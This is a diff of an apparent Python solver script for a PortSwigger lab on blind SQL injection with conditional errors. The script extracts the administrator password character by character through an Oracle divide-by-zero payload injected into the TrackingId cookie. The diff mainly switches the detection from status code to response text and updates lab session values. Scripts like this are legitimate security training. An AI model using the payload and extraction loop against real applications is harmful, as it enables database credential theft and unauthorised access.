@@ -1,7 +1,7 @@
 # Portswigger Lab: Blind SQL injection with conditional errors
 # https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 # Author: d1Zzy666
-# Date: 15-10-2024
+# Date: 14-10-2024
 
 """
 Execution path:
@@ -13,24 +13,28 @@ Execution path:
 
 """
 Boolean options:
-FALSE - HTTP Status code 200 OK
-TRUE - HTTP Status code 500 Internal Server Error
+FALSE - "My account" is displayed.
+TRUE - "Internal Server Error" is displayed.
 """
 
 # Libraries & imports etc.
+import argparse
+import base64
 from datetime import datetime
-from http import HTTPStatus
+import json
 from multiprocessing import Process                                   
+import os, signal, sys
+import re
 import requests
 from socketserver import TCPServer
 import time
 import urllib3                                  # Used to suppress SSL warnings
+from websocket import create_connection
 
 # global variables
-labid = "0a5d006f04b4ce6080dc0814005200a3"              # UPDATE
+labid = "0af6008704dd0d798023861100b40062"              # UPDATE
 targetdomain = "web-security-academy.net"
-sessionid = "WSb2MzUQgU53cRpLuk62h2tzgstfymm3"          # UPDATE
-trackingid = "B7f71YCyBkA6jtmZ"                         # UPDATE
+session = "DFt7jUmvhjjwgIgyDq6h4ZDT97THZd54"            # UPDATE   
 
 charset = "abcdefghijklmnopqrstuvwxyz0123456789"
 truetxt = "Internal Server Error"
@@ -56,18 +60,15 @@ def passwdretrieval():
     session = requests.session()
     urllib3.disable_warnings()
     (print("Retrieving administrator password..."))
-       
     while True:
         found_char = False
         for char in charset:
             url = f"https://{labid}.{targetdomain}:443/"
-            payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{position},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'"
-            
-            cookies = {"TrackingId": f"{trackingid}{payload}", "session": f"{sessionid}"}
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
+            cookies = {"TrackingId": f"42axXZAJmTiIYQYi'||(SELECT+CASE+WHEN+SUBSTR(password,{position},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'", "session": f"{session}"}
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}                 
             x = session.get(url, cookies=cookies, headers=headers, verify=False, proxies=proxies)
 
-            if (x.status_code == 500):
+            if f"{truetxt}" in x.text:
                 adminpassword += char
                 print(f"[+] Identified a character {char} at position {position}.")
                 position += 1
